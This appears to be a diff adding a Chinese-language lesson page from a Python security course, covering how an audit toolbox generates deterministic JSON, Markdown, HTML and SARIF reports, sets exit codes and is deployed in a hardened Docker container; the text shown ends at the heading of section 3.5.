@@ -1,0 +1,1286 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Day 165 — 阶段项目（四）：安全审计工具箱 · 报告生成 + Docker 部署</title>
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body class="lesson">
+<a class="skip" href="#content">跳到正文</a>
+
+<header class="lhead">
+  <a class="back" href="../index.html">← 返回总目录</a>
+  <h1>Day 165 — 阶段项目（四）：安全审计工具箱 · 报告生成 + Docker 部署</h1>
+  <div class="lmeta">
+    <span class="badge">网络安全开发</span>
+    <span class="badge">993 行</span>
+    <span class="badge">4 个可运行脚本</span>
+    <div class="pills"><a class="pill-link" href="code/" download>📦 下载本课代码（4 个文件）</a><a class="pill-link" href="exercises.html">✍️ 练习与清单</a><a class="pill-link" href="diagrams.html">🗺️ 图解</a><a class="pill-link" href="https://github.com/Geek0ne/Python-200-days/tree/main/days/day-165-安全审计工具箱-part4" rel="noopener">📁 GitHub 源文件</a></div>
+  </div>
+</header>
+
+<div class="lwrap">
+  <nav class="toc" aria-label="目录">
+    <div class="toc-h">本页目录</div>
+    <a class="toc-l2" href="#1">1. 学习目标</a>
+<a class="toc-l2" href="#2">2. 概念解释</a>
+<a class="toc-l3" href="#21">2.1 阶段项目要做什么（今天站在哪个位置）</a>
+<a class="toc-l3" href="#22">2.2 为什么&quot;发现&quot;和&quot;报告&quot;必须分开建模</a>
+<a class="toc-l3" href="#23">2.3 报告的三类消费者</a>
+<a class="toc-l3" href="#24">2.4 单一数据源：渲染器里不许算东西</a>
+<a class="toc-l3" href="#25">2.5 确定性：为什么报告必须字节级可复现</a>
+<a class="toc-l3" href="#26-id">2.6 稳定 id：为什么是内容哈希</a>
+<a class="toc-l3" href="#27">2.7 风险分：为什么&quot;严重度 × 置信度&quot;</a>
+<a class="toc-l3" href="#28">2.8 覆盖缺口：为什么它必须单独存在</a>
+<a class="toc-l3" href="#29">2.9 四种格式的信息损失</a>
+<a class="toc-l3" href="#210">2.10 为什么报告层要容器化</a>
+<a class="toc-l3" href="#211">2.11 容器安全的默认姿势</a>
+<a class="toc-l2" href="#3">3. 原理解释</a>
+<a class="toc-l3" href="#31-rendering-pipeline">3.1 渲染管线（rendering pipeline）</a>
+<a class="toc-l3" href="#32">3.2 去重与排序</a>
+<a class="toc-l3" href="#33-sarif-level">3.3 严重度 → SARIF level 映射的取舍</a>
+<a class="toc-l3" href="#34">3.4 退出码：工具的对外契约</a>
+<a class="toc-l3" href="#35-exec-entrypoint">3.5 为什么 exec 形式的 ENTRYPOINT 是门禁的前提</a>
+<a class="toc-l3" href="#36-html-xss">3.6 HTML 渲染必须转义（否则审计工具变成 XSS 载体）</a>
+<a class="toc-l3" href="#37">3.7 多阶段构建省掉了什么（实测数据）</a>
+<a class="toc-l3" href="#38-root-eacces">3.8 非 root + 绑定挂载 = EACCES（本课实测撞到的坑）</a>
+<a class="toc-l3" href="#39">3.9 资源上限：为什么文本处理程序也要限内存</a>
+<a class="toc-l2" href="#4">4. 图解</a>
+<a class="toc-l3" href="#41">4.1 渲染管线（数据流单向）</a>
+<a class="toc-l3" href="#42-mermaid">4.2 确定性（Mermaid）</a>
+<a class="toc-l2" href="#5-api">5. 定义与使用方法（API 速查表）</a>
+<a class="toc-l3" href="#51-finding">5.1 Finding 字段</a>
+<a class="toc-l3" href="#52-report">5.2 Report 方法</a>
+<a class="toc-l3" href="#53-cli-03-toolbox-clipy">5.3 CLI 参数（03-toolbox-cli.py）</a>
+<a class="toc-l3" href="#54">5.4 退出码契约</a>
+<a class="toc-l3" href="#55">5.5 常用命令速查</a>
+<a class="toc-l3" href="#56-report_core_redact_patterns">5.6 脱敏规则表（report_core._REDACT_PATTERNS）</a>
+<a class="toc-l2" href="#6">6. 实战代码案例</a>
+<a class="toc-l3" href="#61">6.1 文件清单</a>
+<a class="toc-l3" href="#62-a">6.2 场景 A：本地出报告（最常用）</a>
+<a class="toc-l3" href="#63-bci">6.3 场景 B：CI 门禁</a>
+<a class="toc-l3" href="#64-c">6.4 场景 C：四种退出码全部实测</a>
+<a class="toc-l3" href="#65-d">6.5 场景 D：容器里跑完整流水线</a>
+<a class="toc-l3" href="#66">6.6 代码里最值得抄走的三个片段</a>
+<a class="toc-l2" href="#7">7. 真机实测验证（不是示例输出，是跑出来的）</a>
+<a class="toc-l3" href="#71">7.1 构建</a>
+<a class="toc-l3" href="#72">7.2 镜像体积（分层收益）</a>
+<a class="toc-l3" href="#73-root-eacces">7.3 翻车记录：非 root + 绑定挂载 = EACCES</a>
+<a class="toc-l3" href="#74">7.4 门禁在容器里的退出码透传</a>
+<a class="toc-l3" href="#75">7.5 脱敏实测（含一次修复）</a>
+<a class="toc-l3" href="#76">7.6 确定性实测</a>
+<a class="toc-l3" href="#77">7.7 脱敏顺序实测（误报实证）</a>
+<a class="toc-l3" href="#78">7.8 一个诚实的遗留项</a>
+<a class="toc-l2" href="#8">8. 思考题</a>
+<a class="toc-l3" href="#1-datetimenow">思考 1：为什么报告层不能用 datetime.now()？</a>
+<a class="toc-l3" href="#2-target-rule_id-severity">思考 2：如果两个不同的问题碰巧有相同的 (target, rule_id, severity)，会怎样？</a>
+<a class="toc-l3" href="#3html-htmlescape">思考 3：HTML 渲染为什么必须 html.escape()？举一个具体攻击路径</a>
+<a class="toc-l3" href="#4-4-0">思考 4：为什么退出码 4（覆盖缺口）不能和 0（通过）合并？</a>
+<a class="toc-l3" href="#5-severity">思考 5：门禁用原始 severity，排序用风险分——为什么不统一成一套？</a>
+<a class="toc-l2" href="#9">9. 收官：四天项目的一句话总结</a>
+  </nav>
+  <main id="content" class="lbody">
+<h1 id="day-165-docker">Day 165 — 阶段项目（四）：安全审计工具箱 · 报告生成 + Docker 部署</h1>
+<blockquote>
+<p><strong>Phase 10 — 网络安全开发（Day 146–165）</strong> · 主题：安全审计工具箱（Day 162–165 四天项目的第 4 天 · 收官）</p>
+<p><strong>使用边界（重要，读完再动手）</strong>：<br>
+- 只对<strong>你自己拥有、或已获书面授权</strong>的目标做审计。<br>
+- 本课所有实验数据都是 <code>code/findings.example.json</code> —— <strong>手工构造的合成数据</strong>，<br>
+  目标是 <code>127.0.0.1</code> 上的自建靶场或 <code>audit-process</code> 这类流程占位符。<br>
+- 本课<strong>不发起任何网络请求</strong>。报告生成器只读本地 JSON、写本地文件。<br>
+  容器的默认网络模式是 <code>none</code>，这是刻意的：一个只处理文本的程序<br>
+  没有理由拥有网络。<br>
+- 报告里的"证据"字段来自被审计目标，属于<strong>不可信输入</strong>。<br>
+  渲染 HTML 时必须转义（见 README 第 3.6 节）。<br>
+- 教材中的地址一律为回环或文档网段（RFC 5737 的 <code>192.0.2.0/24</code>）。</p>
+</blockquote>
+<hr>
+<h2 id="1">1. 学习目标</h2>
+<p>完成本课后，你应该能够：</p>
+<ul>
+<li>说清四天阶段项目的整体形状，以及为什么<strong>报告层</strong>才是这个项目的"产品"</li>
+<li>解释"发现（finding）"和"报告（report）"为什么必须分开建模</li>
+<li>说清报告的<strong>三类消费者</strong>（人 / 机器 / 流程），以及为什么三种格式都不能省</li>
+<li>解释<strong>单一数据源</strong>原则：为什么渲染器里"不许算东西"</li>
+<li>说清报告为什么要<strong>字节级确定</strong>，以及不确定性会毁掉哪些能力</li>
+<li>解释稳定 id 为什么用内容哈希，而不是自增序号或 UUID</li>
+<li>说清"风险分 = 严重度 × 置信度"背后的动机，以及只看严重度会错在哪</li>
+<li>解释<strong>覆盖缺口</strong>为什么要独立建模并单独占一个退出码</li>
+<li>说出 JSON / Markdown / HTML / SARIF 四种格式各自的信息损失发生在哪里</li>
+<li>解释非 root 容器 + 绑定挂载为什么会 <strong>EACCES</strong>，以及三种正确修法</li>
+<li>说清 exec 形式的 ENTRYPOINT 为什么是"退出码门禁"能成立的前提</li>
+<li>复现本课的 Docker 构建，并说清多阶段构建省掉了什么</li>
+<li>明确本工具<strong>不做</strong>什么（扫描、利用、解密、改包），以及这些边界为什么必要</li>
+</ul>
+<hr>
+<h2 id="2">2. 概念解释</h2>
+<h3 id="21">2.1 阶段项目要做什么（今天站在哪个位置）</h3>
+<p>Day 159 做了"审计工具箱 v0"（规则引擎 + 报告 + CLI 门禁），Day 160 做了日志分析，<br>
+Day 161 做了渗透测试框架。Day 162–165 把这几天分散的能力拼成一个<strong>完整的资产审计工具</strong>：</p>
+<pre class="plain"><code>Day 162（大前天）  资产面：端口扫描 + 目录爆破 + 指纹识别        ← 有哪些&quot;资产&quot;
+Day 163（前天）    漏洞面：SQLi 检测 + XSS 检测                 ← 资产上有哪些&quot;弱点&quot;
+Day 164（昨天）    流量面：正向代理 + 流量分析（先脱敏再检测）    ← 实际网络上发生了什么
+Day 165（今天）    产出面：报告生成 + 容器化交付                 ← 把它变成&quot;可交付物&quot;
+</code></pre>
+<p>前三天的产出都是<strong>内存里的对象</strong>和<strong>终端里的输出</strong>。这些东西有一个共同问题：<br>
+<strong>它们是临时的</strong>。终端缓冲区会滚掉，进程退出对象就没了。</p>
+<p>一个审计工具如果没有报告层，它就不是审计工具，只是一个"扫描脚本"。<br>
+区别在哪？审计（audit）这个词本身要求<strong>可复核</strong>：<br>
+三个月后有人问"当时你为什么说这台机器是安全的"，<br>
+你必须能拿出当时的证据链。拿不出来，那次审计就不存在。</p>
+<p>所以今天做的不是"加一个输出格式"，而是<strong>给整个工具补上它的产品形态</strong>。</p>
+<h3 id="22">2.2 为什么"发现"和"报告"必须分开建模</h3>
+<p>新手常见的写法是：检测到问题就直接 <code>print()</code> 一段格式化文本。<br>
+问题在于，<strong>同一份发现要服务很多种输出</strong>：</p>
+<pre class="plain"><code>                     ┌─────────────────┐
+   扫描结果 ────►    │   Finding 列表   │   ← 唯一事实来源
+                     └────────┬────────┘
+                              │
+        ┌────────────┬────────┼────────┬────────────┐
+        ▼            ▼        ▼        ▼            ▼
+     Markdown      HTML      JSON    SARIF      终端摘要
+     （给人看）  （给人看）  （给机器） （给CI/IDE） （给正在跑的人）
+</code></pre>
+<p>如果"检测"这一步直接产出 Markdown 文本，那么：<br>
+- 想加一个 HTML 输出 → 必须重写一遍检测逻辑（或写一个脆弱的文本解析器）<br>
+- 想在 CI 里按严重度卡门禁 → 只能去 grep 文本，一改排版就崩<br>
+- 想算"今天比昨天新增了几个问题" → 需要 diff 文本，误报率高得没法用</p>
+<p>把 Finding 抽成<strong>数据</strong>之后，上面每一件事都变成一次纯函数调用。<br>
+这就是"数据与表示分离"（separation of data and presentation）在安全工具里的具体兑现。</p>
+<h3 id="23">2.3 报告的三类消费者</h3>
+<p>同一份报告，实际上有三种完全不同的读者，他们对"好报告"的定义互相冲突：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">消费者</th>
+<th style="text-align: left;">是谁</th>
+<th style="text-align: left;">要什么</th>
+<th style="text-align: left;">不要什么</th>
+<th style="text-align: left;">对应格式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>人（评审/工单）</strong></td>
+<td style="text-align: left;">开发者、负责人、甲方</td>
+<td style="text-align: left;">能读懂、能定位、有修复建议</td>
+<td style="text-align: left;">一堆原始字节</td>
+<td style="text-align: left;">Markdown / HTML</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>机器（分析/归档）</strong></td>
+<td style="text-align: left;">脚本、数据库、后续对比</td>
+<td style="text-align: left;">结构稳定、字段完整、无歧义</td>
+<td style="text-align: left;">排版、颜色</td>
+<td style="text-align: left;">JSON</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>流程（CI/IDE）</strong></td>
+<td style="text-align: left;">GitHub Code Scanning、门禁</td>
+<td style="text-align: left;">标准 schema、行级定位、退出码</td>
+<td style="text-align: left;">自由发挥的字段名</td>
+<td style="text-align: left;">SARIF + exit code</td>
+</tr>
+</tbody>
+</table>
+<p>关键认识：<strong>没有一个格式能同时满足三者</strong>，所以"输出四种"不是偷懒，是必要的。<br>
+反过来说，如果只有 Markdown，那么"报告能不能被程序消费"这件事就永远做不到，<br>
+报告也就永远停在"截图"的水平。</p>
+<h3 id="24">2.4 单一数据源：渲染器里不许算东西</h3>
+<p>本课的架构铁律只有一条：</p>
+<blockquote>
+<p><strong>所有渲染器只允许做字符串拼接，绝不允许做计算。</strong></p>
+</blockquote>
+<p>具体说，<code>Report.model()</code> 产出一份规范化的中间表示（IR），<br>
+四个渲染器都只从中取字段、拼字符串。这条规则带来三个直接好处：</p>
+<ol>
+<li><strong>不会漂移</strong>：如果排序逻辑写在渲染器里，四个渲染器就会有四份排序，<br>
+   早晚会出现"Markdown 里 critical 在上面，HTML 里在下面"这种荒唐的 bug。</li>
+<li><strong>可测试</strong>：只要测 <code>model()</code>，四个输出就都被覆盖了核心逻辑。</li>
+<li><strong>可审计</strong>：想验证"报告有没有漏掉严重问题"，只需要看一处代码。</li>
+</ol>
+<p>代价是：多了一层间接。新手会觉得"我就想输出一个表格，为什么要绕一圈"。<br>
+这一圈绕得值——它是本课唯一一个"架构级"的取舍。</p>
+<h3 id="25">2.5 确定性：为什么报告必须字节级可复现</h3>
+<p><strong>确定性（determinism）</strong> 指：同一份输入，重复运行得到<strong>字节完全相同</strong>的输出。</p>
+<p>听起来像洁癖，其实是很多能力的<strong>前提条件</strong>：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">能力</th>
+<th style="text-align: left;">报告不确定时会怎样</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>git diff</code> 审计产物</td>
+<td style="text-align: left;">每次运行整个文件都在变，无法看出目标有没有变化</td>
+</tr>
+<tr>
+<td style="text-align: left;">回归对比（今 vs 昨）</td>
+<td style="text-align: left;">误报铺满，真实变化被淹没</td>
+</tr>
+<tr>
+<td style="text-align: left;">产物哈希做"是否变化"判据</td>
+<td style="text-align: left;">哈希每次都不同，判据失效</td>
+</tr>
+<tr>
+<td style="text-align: left;">CI 缓存 / 幂等重跑</td>
+<td style="text-align: left;">无法判断"这次结果和上次一样吗"</td>
+</tr>
+<tr>
+<td style="text-align: left;">证据链学术意义上的可复议</td>
+<td style="text-align: left;">别人复现不出你的报告，等于无法验证</td>
+</tr>
+</tbody>
+</table>
+<p>要做到确定性，必须掐死三个不确定来源：</p>
+<ol>
+<li><strong>时间戳</strong> —— <code>datetime.now()</code> 是确定性的头号杀手。<br>
+   做法：时间戳由<strong>调用方传入</strong>（<code>generated_at</code>），<br>
+   或者用 <code>SOURCE_DATE_EPOCH</code> 环境变量固定。<br>
+   （<code>SOURCE_DATE_EPOCH</code> 是可复现构建领域的既有约定，见 reproducible-builds.org。）</li>
+<li><strong>顺序</strong> —— dict 在旧版本 Python 无序、多线程收集顺序不定、集合的迭代顺序不定。<br>
+   做法：排序键写死成一个元组，排序在渲染前统一做一次。</li>
+<li><strong>标识符</strong> —— <code>uuid4()</code> 每次不同，自增序号在增删后含义会变。<br>
+   做法：用<strong>内容哈希</strong>做 id。</li>
+</ol>
+<p>本课的代码里，<code>Report.render_json()</code> 对同一输入调用两次，<br>
+输出是逐字节相同的；<code>code/out/day165-determinism.md</code> 的内容哈希也因此稳定。</p>
+<h3 id="26-id">2.6 稳定 id：为什么是内容哈希</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="nd">@property</span>
+<span class="k">def</span> <span class="nf">id</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="k">return</span> <span class="n">stable_id</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">rule_id</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">severity</span><span class="p">)</span>
+</code></pre></div>
+<p>三条设计决策，每条都值得说清：</p>
+<p><strong>（a）为什么不用 UUID？</strong><br>
+UUID 是"唯一"的，但不是"稳定"的。同一条 SQL 注入，今天扫描的 id 是 <code>a1b2…</code>，<br>
+明天是 <code>c3d4…</code>。于是"新增/已修复"完全算不出来——每次运行看起来都是全新的 7 条。</p>
+<p><strong>（b）为什么不用自增序号？</strong><br>
+序号稳定，但<strong>含义不稳定</strong>。原本 <code>#3</code> 是 XSS，前面删掉一条之后 <code>#3</code> 变成了端口开放。<br>
+任何基于序号的对比都会指错对象。</p>
+<p><strong>（c）为什么字段只放 target + rule_id + severity？</strong><br>
+这是个刻意的取舍。如果把 <code>title</code> 和 <code>reason</code> 也放进哈希：<br>
+- 好处：文案改了也算"新问题"（一般<strong>不</strong>想要这个）<br>
+- 坏处：修一个错别字就让整个问题换 id，历史对比全断</p>
+<p>所以本课把"可变文案"排除在主键之外。<br>
+原则：<strong>id 应该由"问题是什么"决定，而不是由"我们怎么描述它"决定</strong>。</p>
+<p>有了稳定 id，对比就退化成一次集合运算：</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">new_ids</span> <span class="o">=</span> <span class="n">cur_ids</span> <span class="o">-</span> <span class="n">prev_ids</span>    <span class="c1"># 本次新增</span>
+<span class="n">fixed</span>   <span class="o">=</span> <span class="n">prev_ids</span> <span class="o">-</span> <span class="n">cur_ids</span>    <span class="c1"># 本次已修复</span>
+</code></pre></div>
+<h3 id="27">2.7 风险分：为什么"严重度 × 置信度"</h3>
+<p>只按严重度排序，会犯一个很具体的错误：把<strong>低置信度的高危</strong>压在<strong>已确认的中危</strong>上面。</p>
+<p>本课的风险分：</p>
+<pre class="plain"><code>risk = SEVERITY_WEIGHT[severity] × {high: 1.0, medium: 0.6, low: 0.3}[confidence]
+
+critical 40 · high 25 · medium 12 · low 5 · info 1
+</code></pre>
+<p>于是：<br>
+- 已确认的 high（25×1.0）= <strong>25</strong><br>
+- 低置信度的 high（25×0.3）= <strong>7.5 → 7</strong>，掉到已确认 medium（12）<strong>下面</strong></p>
+<p>为什么这是对的？因为你要让读者先处理<strong>最值得先处理</strong>的问题。<br>
+一个"可能是扫描器"的低置信度告警，排查成本可能比修一个确认的中危还高。<br>
+把它排在前面，等于用误报的时间成本挤掉了真实修复的时间。</p>
+<p>注意这里<strong>没有</strong>把置信度当成"降级"来用（不把 low-confidence high 变成 medium）。<br>
+严重度描述的是"如果成立，影响多大"，置信度描述的是"它成立的可能性"。<br>
+<strong>这是两个正交的维度，混成一个就是信息损失。</strong></p>
+<h3 id="28">2.8 覆盖缺口：为什么它必须单独存在</h3>
+<p>这是安全报告里最容易被删掉、也最要命的一部分。</p>
+<pre class="plain"><code>&quot;本次审计未发现问题&quot;          ← 危险的说法（隐含&quot;全测了、全过了&quot;）
+&quot;本次审计在 A/B/C 范围内未发现问题；
+ D 因 TLS 不可见、E 因无授权账号未测&quot;   ← 诚实的说法
+</code></pre>
+<p>第一句话在两个月后可能被引用为"当时是安全的"，而事实上第 D、E 项从未被测过。<br>
+<strong>把"没测"藏起来的报告，是在生产虚假的安全感。</strong></p>
+<p>所以本课：<br>
+- <code>Report.coverage_gaps</code> 是<strong>独立字段</strong>，不是一句备注<br>
+- 渲染时它<strong>永远</strong>出现在报告里（<strong>即使为空也要写"无"</strong>，<br>
+  因为"缺失"和"写了个无"在读者眼里不一样）<br>
+- CLI 里它单独占退出码 <code>4</code></p>
+<p>为什么退出码 4 不和 1 合并？因为他们的<strong>行动项不同</strong>：<br>
+- 退出码 1（有高危）→ 去修<br>
+- 退出码 4（有缺口）→ 去补测，或者去<strong>明确接受这个盲区</strong></p>
+<p>一个"什么都没测到"的运行如果返回 0，就和"真的全通过"长得一模一样——<br>
+这是审计工具最危险的失败模式。</p>
+<h3 id="29">2.9 四种格式的信息损失</h3>
+<p>格式之间不是"等价转换"，每一次转换都可能<strong>丢信息</strong>。诚实地列出损失点：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">格式</th>
+<th style="text-align: left;">面向</th>
+<th style="text-align: left;">保留</th>
+<th style="text-align: left;"><strong>丢失/风险</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">JSON</td>
+<td style="text-align: left;">机器</td>
+<td style="text-align: left;">全字段、全结构</td>
+<td style="text-align: left;">人不愿读；文件大</td>
+</tr>
+<tr>
+<td style="text-align: left;">Markdown</td>
+<td style="text-align: left;">人（评审）</td>
+<td style="text-align: left;">层级、代码块、diff 友好</td>
+<td style="text-align: left;">无法做行级定位；难机器消费</td>
+</tr>
+<tr>
+<td style="text-align: left;">HTML</td>
+<td style="text-align: left;">人（汇报）</td>
+<td style="text-align: left;">样式、可折叠、可截图</td>
+<td style="text-align: left;"><strong>必须转义</strong>，否则自己变 XSS 载体</td>
+</tr>
+<tr>
+<td style="text-align: left;">SARIF</td>
+<td style="text-align: left;">CI / IDE</td>
+<td style="text-align: left;">标准 schema、行级定位、指纹</td>
+<td style="text-align: left;"><strong>严重度只有三档</strong>（error/warning/note），五档必然压缩</td>
+</tr>
+</tbody>
+</table>
+<p>SARIF 那条损失最值得注意：我们的 <code>critical</code> 和 <code>high</code> 都映射成 <code>error</code>。<br>
+所以本课在 SARIF 的 <code>properties</code> 里额外带上原始 severity/confidence/risk ——<br>
+<strong>压缩可以，但要能还原</strong>。不能还原的压缩叫"信息销毁"。</p>
+<h3 id="210">2.10 为什么报告层要容器化</h3>
+<p>报告生成是一个<strong>纯函数式</strong>任务：输入 JSON → 输出文件，无网络、无状态。<br>
+这种任务容器化的收益特别干净：</p>
+<pre class="plain"><code>&quot;在我机器上是好的&quot;           ← 容器要消灭的头号问题
+  ↓
+&quot;在所有装了 python3.12 且依赖版本一致的地方都一样&quot;
+  ↓
+&quot;在同一个镜像里，永远一样&quot;    ← 这才是确定的
+</code></pre>
+<p>具体到审计场景，还有两个额外的理由：</p>
+<p><strong>（a）证据的可复现性要求"工具版本"是精确的。</strong><br>
+报告里写了 <code>tool_version=audit-toolbox/1.0</code>。<br>
+如果这个版本号对应的其实是一个会随 <code>pip install</code> 时间而漂移的环境，<br>
+那这个版本号就是<strong>假的自证</strong>。镜像 digest 才能给出真正的"同一工具"。</p>
+<p><strong>（b）把"能联网的扫描容器"和"不能联网的报告容器"分开。</strong><br>
+Day 162–164 的扫描工作天然需要网络；报告工作<strong>完全不需要</strong>。<br>
+把后者跑在 <code>--network none</code> 里，即使镜像被污染也没有回传信道。<br>
+<strong>按需给权限，而不是整体给权限。</strong></p>
+<h3 id="211">2.11 容器安全的默认姿势</h3>
+<p>本课 Dockerfile / compose 的每一项都可以归到一条原则：<strong>默认拒绝</strong>。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">配置</th>
+<th style="text-align: left;">挡住什么</th>
+<th style="text-align: left;">不做会怎样</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>USER 10001:10001</code></td>
+<td style="text-align: left;">容器内 root 提权</td>
+<td style="text-align: left;">逃逸后直接拿到宿主 root 级别能力</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>read_only: true</code></td>
+<td style="text-align: left;">运行时篡改自身文件</td>
+<td style="text-align: left;">攻击者落地持久化（改脚本/塞后门）</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>tmpfs /tmp:noexec,16m</code></td>
+<td style="text-align: left;">临时目录当跳板</td>
+<td style="text-align: left;">写马 + 执行；或塞满内存</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>cap_drop: [ALL]</code></td>
+<td style="text-align: left;">网络/挂载等内核能力</td>
+<td style="text-align: left;">需要的、不需要的全都敞着</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>no-new-privileges</code></td>
+<td style="text-align: left;">setuid 提权</td>
+<td style="text-align: left;">镜像里任何 setuid 程序都能抬权</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>network_mode: none</code></td>
+<td style="text-align: left;">数据回传</td>
+<td style="text-align: left;">后门有信道可用</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>mem_limit: 256M</code></td>
+<td style="text-align: left;">畸形输入打爆内存</td>
+<td style="text-align: left;">宿主被一个 2GB JSON 拖死</td>
+</tr>
+</tbody>
+</table>
+<p>最后一条（资源上限）常被忽略，但对"处理外部输入"的程序是必须的：<br>
+<strong>攻击者控制输入大小时，就等于部分控制了你的资源消耗。</strong></p>
+<hr>
+<h2 id="3">3. 原理解释</h2>
+<h3 id="31-rendering-pipeline">3.1 渲染管线（rendering pipeline）</h3>
+<pre class="plain"><code>        ┌─────────────────────────────────────────────────────────┐
+        │ 1. 收集 collect()                                       │
+        │    Finding 从三个面（资产/漏洞/流量）汇入 Report          │
+        └──────────────────────────┬──────────────────────────────┘
+                                   ▼
+        ┌─────────────────────────────────────────────────────────┐
+        │ 2. 归一化 normalize()  ← 唯一的&quot;计算&quot;发生地              │
+        │    · 去重（同 id 只留 risk 最高的一条）                   │
+        │    · 排序（severity → risk → target → rule_id）           │
+        │    · 计数（含 0 值，保证表格形状稳定）                     │
+        │    · 脱敏（出口兜底，幂等）                               │
+        └──────────────────────────┬──────────────────────────────┘
+                                   ▼
+        ┌─────────────────────────────────────────────────────────┐
+        │ 3. 中间表示 model()  ← 与格式无关的规范结构               │
+        │    { schema, scope, generated_at, counts, findings[] }   │
+        └──────────────────────────┬──────────────────────────────┘
+                                   ▼
+        ┌────────────┬─────────────┼─────────────┬────────────────┐
+        │ json dump  │ markdown    │ html escape │ sarif 映射      │
+        │ (无计算)   │ (拼字符串)   │ (拼字符串)   │ (无计算)        │
+        └────────────┴─────────────┴─────────────┴────────────────┘
+</code></pre>
+<h3 id="32">3.2 去重与排序</h3>
+<p><strong>去重为什么必须做？</strong> 因为同一个问题会从多个面被发现。<br>
+例：一个明文口令既会被 Day 164 的流量规则命中，也可能被 Day 163 的检测命中。<br>
+如果不去重，报告会显示"2 个高危"，实际只有 1 个 —— <strong>风险被虚高，读者会失去信任</strong>。</p>
+<p>去重键是 <code>id</code>，冲突时保留 <code>risk</code> 更高的一条（保留证据更充分的那份描述）。</p>
+<p><strong>排序键为什么是四元组？</strong></p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="p">(</span><span class="n">SEVERITY_ORDER</span><span class="p">[</span><span class="n">severity</span><span class="p">],</span> <span class="o">-</span><span class="n">risk</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">rule_id</span><span class="p">)</span>
+</code></pre></div>
+<ul>
+<li>第一维 severity：读者第一眼关心严重度</li>
+<li>第二维 <code>-risk</code>：同严重度内按风险分从高到低（注意负号）</li>
+<li>第三维 target：同分时按目标分组，便于"一次修完一台机器"</li>
+<li>第四维 rule_id：<strong>最后的兜底</strong>，保证全序，排序结果唯一</li>
+</ul>
+<p>第四维最容易被忽略但它最要紧：如果前三维全相等，Python 的 <code>sort</code> 会退化成<br>
+"保持输入顺序"（稳定排序），于是<strong>输入顺序又漏进输出</strong>，确定性就破了。<br>
+写死一个不可能重复的末位键，才能保证全序。</p>
+<h3 id="33-sarif-level">3.3 严重度 → SARIF level 映射的取舍</h3>
+<pre class="plain"><code>critical ┐
+high     ┼──► &quot;error&quot;     （CI 里都会让流水线变红）
+medium   ┼──► &quot;warning&quot;
+low      ┐
+info     ┴──► &quot;note&quot;
+</code></pre>
+<p>为什么把 critical 和 high 都压成 error？因为 SARIF 的 <code>level</code> 只有三档，<br>
+而我们在 <code>properties</code> 里保留了原始 <code>severity</code>。取舍逻辑是：<br>
+<strong>在 CI 的语境里，"必须修"和"必须修"的区分不如"必须修 vs 建议修"重要。</strong></p>
+<p>这是一个普遍的模式：向外输出时必须降级到对方 schema 的表达能力，<br>
+但<strong>在扩展字段里保留原始精度</strong>，让有能力消费的人拿得到。</p>
+<h3 id="34">3.4 退出码：工具的对外契约</h3>
+<pre class="plain"><code>0  通过（可能无发现，也可能都在阈值以下）
+1  有达到/超过阈值的发现      → 行动：去修
+2  入参/输入数据错误           → 行动：改用法
+3  渲染或写盘失败              → 行动：查磁盘/权限
+4  存在覆盖缺口                → 行动：补测 或 显式接受盲区
+</code></pre>
+<p>设计要点：</p>
+<ol>
+<li><strong>2 和 3 分开</strong>：用法错和磁盘满，是两类完全不同的故障（本课实测中真的撞到了 3）。</li>
+<li><strong><code>--fail-on high</code> 同时命中 critical</strong>：<br>
+   语义是"达到或<strong>超过</strong>"，所以阈值是<strong>上界</strong>而不是等号。<br>
+   这条必须写进 <code>--help</code>，否则用户会以为 <code>high</code> 只管 high。</li>
+<li><strong>1 优先于 4</strong>：有高危就直接 1。因为"去修"比"去补测"更紧急，<br>
+   多返回一个码不会让人更快行动，反而会分散注意力。</li>
+<li><strong>不要用 <code>sys.exit(True)</code></strong>：Python 里 <code>True</code> 是 1、<code>False</code> 是 0，<br>
+   看起来能用，但读代码的人会以为这是个布尔。<br>
+   用命名常量（<code>EXIT_FINDINGS = 1</code>）表达意图。</li>
+</ol>
+<h3 id="35-exec-entrypoint">3.5 为什么 exec 形式的 ENTRYPOINT 是门禁的前提</h3>
